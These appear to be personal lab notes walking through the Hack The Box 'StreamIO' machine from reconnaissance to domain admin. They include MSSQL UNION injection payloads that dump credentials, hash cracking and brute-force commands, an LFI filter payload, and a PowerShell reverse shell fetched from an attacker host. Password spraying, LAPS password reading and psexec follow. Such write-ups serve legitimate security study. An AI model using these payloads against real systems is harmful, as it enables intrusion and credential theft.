[[Enumeration]][[nmap]] #mssqlenumeration
#Enumeration #nmap
`nmap -sC -sV -oA nmap/streamio 10.10.11.158`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`

![[Pasted image 20250105201607.png]]
Add found domains to `/etc/hosts`

![[Pasted image 20250105201727.png]]
Start with web enumeration.

Just see IIS page 

![[Pasted image 20250105201811.png]]
There is a site at the `https://streamio[.]htb` tho

![[Pasted image 20250105201927.png]]
and a site at `https://watch[.]streamio[.]htb`

![[Pasted image 20250105202050.png]]
Enum withe Burpsuite confirms Microsoft IIS server and x-powered-by php/7.2.26 and asp.net

![[Pasted image 20250105202320.png]]

Enumerate website with [[feroxbuster]]

[[Directory Busting]]

https://github.com/epi052/feroxbuster


`feroxbuster -k -u https://streamio.htb -x php -o streamio.htb.feroxbuster`

![[Pasted image 20250105202752.png]]

This command uses the default wordlist (which is case sensitive), but we want to use a non-case sensitive wordlist to speed up the enumeration.

`feroxbuster -k -u https://streamio.htb -x php -o streamio.htb. feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt`

![[Pasted image 20250105203108.png]]

Starting up another one for the second site. 

`feroxbuster -k -u https://watch.streamio.htb -x php -o watch.streamio.htb. feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt`

Let these run in the background and start poking at the sites. 

Starting with contact form to see response from the site. 

![[Pasted image 20250105203519.png]]

![[Pasted image 20250105203549.png]]
Adding email here with burp proxy on 

![[Pasted image 20250105203700.png]]
Going back to directory bustin' results 

![[Pasted image 20250105203834.png]]
Here is `/search.php`

![[Pasted image 20250105203924.png]]
Sending this search bar into [[ffuf]]

https://github.com/ffuf/ffuf

Using this POST request to form the ffuf commands

![[Pasted image 20250105204339.png]]

`ffuf -k -u https://watch.streamio.htb/search.php -d "q=FUZZ" -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/x-www-form-urlencoded'`

![[Pasted image 20250105204530.png]]

Results with some lines filtered out. 

![[Pasted image 20250105204640.png]]
Going through this list and entering the special characters into the search bar manually and viewing results. 

Ex: `.` returned all movies with a period. 

Guessing what the SQL query looks like based on ffuf results:

![[Pasted image 20250105205134.png]]
Basically that line 1 is the syntax of this SQL database. 

Trying out UNION injections in Burp's Repeater


![[Pasted image 20250105205409.png]]

Found a valid union with this one:
![[Pasted image 20250105205500.png]]
Let's exfil data. 

Go to #mssql cheatsheet 

https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

Using xp_dirtree to make the MSSQL database connect back to us and steal the hash

![[Pasted image 20250106153312.png]]
netcat listener

![[Pasted image 20250106153334.png]]
Because this works, we can use #responder to see what user we're running as. 

![[Pasted image 20250106153516.png]]
Re-execute Burp request:

![[Pasted image 20250106153601.png]]

View responder terminal and see it's running as DC$

![[Pasted image 20250106153646.png]]
Dead end because this is a machine account. 

Back to burp and changing xp_dirtree to xp_cmdshell

Testing this with a ping command

![[Pasted image 20250106153915.png]]
Listen for ping using #tcpdump 

`sudo tcpdump -i tun0 icmp`

This is a dead end also. 

Going to try reconfiguration using commands from mssql cheatsheet. 

`EXEC sp_configure ‘show advanced options’, 1;`

`EXEC sp_configure ‘xp_cmdshell’, 1;`

![[Pasted image 20250106154249.png]]
Still nothing from tcpdump terminal.

Start manually enumerating database

1. Version
![[Pasted image 20250106154508.png]]
2. user 
![[Pasted image 20250106154542.png]]
3. database name
![[Pasted image 20250106154625.png]]
Need to figure out table schema before exfilling data.

https://learn.microsoft.com/en-us/sql/t-sql/language-reference?view=sql-server-ver16

![[Pasted image 20250106155049.png]]
Query to get table names and ids
```
500' union select 1, (select string_agg(concat(name,':',id),'|')from streamio..sysobjects where xtype='u'),3,4,5,6-- -
```
![[Pasted image 20250106155404.png]]

Query to get column names 
```
500' union select 1, (select string_agg(concat(name,'|')from streamio..syscolumns where id=901578250),3,4,5,6-- -
```
![[Pasted image 20250106155612.png]]
Columns include usernames and passwords so query for those:
```
500' union select 1, (select string_agg(concat(username,':',password),'|')from users),3,4,5,6-- -
```
![[Pasted image 20250106155942.png]]
`vi users.txt`

Paste in the data.

![[Pasted image 20250106160218.png]]

Remove all the spaces:

`:%s/[ ]*//g`

![[Pasted image 20250106160143.png]]

Line breaks we want are represented by `|`

So - what is vim syntax

`:%s/|\r/g`

Voila:

![[Pasted image 20250106160348.png]]
Guessing these passwords are md5 sum because they are 32 characters. 

![[Pasted image 20250106164623.png]]

MD5 is mode 0 in #hashcat 

`./hashcat.bin -m 0 --user hashes/streamio.hashes /opt/wordlist/rockyou.txt`

![[Pasted image 20250106165025.png]]

Show cracked hashes

`./hashcat.bin -m 0 --user hashes/streamio.hashes --show

![[Pasted image 20250106165207.png]]
Try to login with some of these creds at `login.php`.

Intercept login requests with Burp and send to repeater 

![[Pasted image 20250106190133.png]]

Use #hydra to bruteforce the login.

Need to convert the username:hash:password file to one username list and one password list for Hydra. 

`cat user.hash.pw.txt | awk -F: '{print $1":"$3}' > userpass.txt`
![[Pasted image 20250106190500.png]]
`-C` flag for hydra is the : separated password format (i.e. the format of userpass.txt)

`hydra -C userpass.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"`

Found a match 

![[Pasted image 20250106191020.png]]
Login with found creds 

Going back to hidden directories:

![[Pasted image 20250106191158.png]]
Navigate to `/admin`

Need to fuzz this argument in the URL

![[Pasted image 20250106191325.png]]

Using #ffuf for this fuzzing again

Grab authorization cookie from Burp

![[Pasted image 20250106191704.png]]


`ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=0oaqmve702c31ioeq96tfl5pan' --fs 1678`

![[Pasted image 20250106191834.png]]

New parameter to test: "debug"

![[Pasted image 20250106191957.png]]

Looks like this option is for developers only 

![[Pasted image 20250106201602.png]]

Adding more parameters..

```
?debug=php://filter/convert.base64-encode/resource=/etc/passwd
```
![[Pasted image 20250106202155.png]]
Got something:
![[Pasted image 20250106202230.png]]
![[Pasted image 20250106202356.png]]
`PD9waHAKZGVmaW5|KCdpbmNsdWRIZCcsdHJ1ZSk7CnNIc3Npb25fc3RhcnQoKTsKaWYoIW|zc2VOKC/PgoJCTwvZGI2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==

Decoding this base64 with 

`echo -n 'PD9waHAKZGVmaW5|KCdpbmNsdWRIZCcsdHJ1ZSk7CnNIc3Npb25fc3RhcnQoKTsKaWYoIW|zc2VOKC/PgoJCTwvZGI2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==' | base64 -d > index.php`

Got a `db_admin` password

`"db admin", "PWD" => 'B1@hx31234567890'`

![[Pasted image 20250106202648.png]]
Repeating this with `/master.php`

![[Pasted image 20250106202825.png]]

`echo -n 'PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRIZmluZWQoJ2luY2x1ZGVkJykpD‹/Pil+DQoJCQkJPGlucHVOIHR5cGU9InN1Ym1pdClgY2xhc3M9ImJObiBidG4tc20gYnRuLXByaW1hcnkilHZhb' | base64 -d > master.php`

Some contents of `master.php`

![[Pasted image 20250106203106.png]]
Indicate that we can do a file inclusion.

Back to Burp Repeater to try to reach `/etc/passwd

![[Pasted image 20250106203236.png]]
No results.

Messing with different include statements:

![[Pasted image 20250106203429.png]]
No results. 

Trying this:

![[Pasted image 20250106203818.png]]


ippsec.php on attacker machine just says `echo -n Please Subscribe`

![[Pasted image 20250106203752.png]]
Modifying `ippsec.php` to enumerate webserver

`system("whoami");`

![[Pasted image 20250106203936.png]]
Result in the form lul

![[Pasted image 20250106204028.png]]
Replacing `ippsec.php` with a reverse shell

On Windows, we can use #conptyshell [[ConPtyShell]]

GitHub:
https://github.com/antonioCoco/ConPtyShell


Copy this PowerShell file 

https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1

Replace `ippsec.php` with 

`system("powershell IEX(IWR http://10.10.14.8/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 9001`

Then start netcat listener thang on attacker box

`stty raw -echo; (stty size; cat) | nc -lvnp 9001`

Send request on Burp again.

Finally got reverse shell:

![[Pasted image 20250106205230.png]]
Remembering from recon that there is a `streamio_backup` database.

Also finally using the admin creds discovered within `index.php` with #sqlcmd to find even more valid creds. 

Dump the backup database with

`sqlcmd -U db_admin -p 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select username, password from users;'`

![[Pasted image 20250106205741.png]]
Copy this info and save on local box. Remove spaces for cracking in #hashcat 

`./hashcat.bin -m 0 --user hashes/streamio2.hashes /opt/wordlist/rockyou.txt`

![[Pasted image 20250106210150.png]]

`./hashcat.bin -m 0 --user hashes/streamio2.hashes --show

![[Pasted image 20250106210240.png]]

Doing the awk thing again. 

![[Pasted image 20250106210335.png]]
Creating users.txt

`cat user.hash.pw.txt | awk -F: '{print $1}' › users.txt`

Creating pw.txt 

`cat user.hash.pw.txt | awk -F: '{print $3}' > pw.txt`

![[Pasted image 20250106210520.png]]

Using #crackmapexec 

`cme smb 10.10.11.158 -u users.txt -p pw.txt --no-bruteforce`

![[Pasted image 20250107204642.png]]

Found one successful login:

`streamI0.htb\nikk37:get_dem_girls2@yahoo.com`

![[Pasted image 20250107204914.png]]

Then use these credentials with cme to see if this user has #winrm access.

He does. 

![[Pasted image 20250107205046.png]]

Use #evilwinrm to login. 

`evil-winrm -i 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com`

![[Pasted image 20250107205301.png]]
Using #winpeas for privilege escalation

https://github.com/peass-ng/PEASS-ng/releases/tag/20250106-5a706ae2

Can download WinPEASany.exe to www directory.

From evilwinrm shell run:

`curl 10.10.14.8/winpeas.exe -o winpeas.exe`

Execute `.\winpeas.exe`

Found out there's firefox creds

![[Pasted image 20250107210128.png]]
Try running Sharpweb

https://github.com/djhohnstein/SharpWeb/releases

This tool is too outdated so manually checking the firefox profiles. 

![[Pasted image 20250107210604.png]]

Use #firepwd to extract firefox passwords. 

https://github.com/lclevy/firepwd

Running #CrackMapExec to spray passwords from Firefox to get JDGodd's password

`cme smb 10.10.11.158 -u users.txt -p pw.txt --no-bruteforce --continue-on-success`

![[Pasted image 20250108203020.png]]

No results from this query. Going to test out the username `JDGodd` with every password.

`cme smb 10.10.11.158 -u JDGodd -p pw.txt`

![[Pasted image 20250108203202.png]]

Got a login (no pw3ned = not an admin)

`JDGodd: 1Dg0dd1s@d0p3cr3@tOr`

![[Pasted image 20250108203320.png]]

Running #Bloodhound 

Running #pythonbloodhoundingestor first (from attacker box)

https://github.com/dirkjanm/BloodHound.py

`python3 bloodhound.py -d streamio.htb -u JDGodd -p 'JDg0ddls@d0p3cr3@tOr' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip`

![[Pasted image 20250108203738.png]]
Start #neo4j 

`sudo neo4j console`

![[Pasted image 20250108203841.png]]

Download #Bloodhound from GitHub [[BloodHound]]

https://github.com/SpecterOps/BloodHound-Legacy/releases

Download the release compatible with attacker machine OS (probably linux x64)

Unzip the file. 

Execute with `./Bloodhound-linux-x64/Bloodhound`

Within BloodHound console..mark JDGodd and yoshihide and nikk37 as owned. 

Starting with `Shortest Path from Owned Principals`

Found something. 

JDGodd has write owner of core staff which can ReadLAPSPassword of the DC.

BloodHound abuse info:
![[Pasted image 20250108205243.png]]
Get #evilwinrm back 

`evil-winrm -i 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'`

![[Pasted image 20250108205628.png]]

Moving #powerview to remote machine. 

It's within the #powersploit recon folder.

`/PowerSploit/Recon/PowerView.ps1`

First load powersploit. 

`iex(iwr http://10.10.14.8/PowerView.ps1 -UseBasicParsing)`

![[Pasted image 20250108205950.png]]
Create password object for JDGodd

`$pwd = ConvertTo-SecureString 'JDg0ddls@d0p3cr3@tOr' -AsPlainText -Force`

![[Pasted image 20250108210145.png]]

`$cred = New-Object System.Management.Automation. PSCredential('streamio.htb\JDGodd' , $pwd)`

![[Pasted image 20250108210333.png]]

![[Pasted image 20250108210506.png]]

![[Pasted image 20250108210720.png]]

Here is LAPS password 

![[Pasted image 20250108210939.png]]
Use this password with #crackmapexec to verify pwn3d as admin 

![[Pasted image 20250108211029.png]]
Remote in with #psexec 

![[Pasted image 20250108211110.png]]
